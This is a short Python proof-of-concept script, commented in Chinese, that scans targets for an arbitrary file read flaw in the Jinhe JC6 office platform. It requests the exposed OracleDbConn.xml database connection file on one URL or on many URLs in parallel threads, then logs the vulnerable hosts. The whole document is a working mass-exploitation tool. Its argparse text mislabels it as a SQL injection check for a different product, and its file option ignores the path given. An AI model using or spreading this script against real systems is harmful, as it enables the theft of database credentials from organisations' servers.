#金和数字化智能办公平台（JC6）中存在的一处任意文件读取漏洞，该漏洞可能导致攻击者获取OracleDbConn.xml文件的敏感信息。
import requests,sys,argparse,urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="用友时空KSOA /servlet/imagefield接口中sKeyvalue参数存在sql注入")

    parse.add_argument('-u','-url',dest='url',type=str,help="Please input -h")
    parse.add_argument('-f','-file',dest='file',type=str,help="Please input -h")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url.strip())
    elif args.file and not args.url:
        lis = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for url in fp.readlines():
                lis.append(url.strip())
            mp = Pool(100)
            mp.map(poc,lis)
            mp.close
            mp.join

    # print("Usage：python "+sys.argv[0]+' -h')



def poc(target):
    payload = '/c6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Content-Length': '0'
    }
    proxy = {
        'http':'http://127.0.0.1:8080',
        'https':'https://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url = target+payload,headers=headers,proxies=proxy,timeout=5,verify=False)
        if 'version' in res1.text:
            print(target)
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()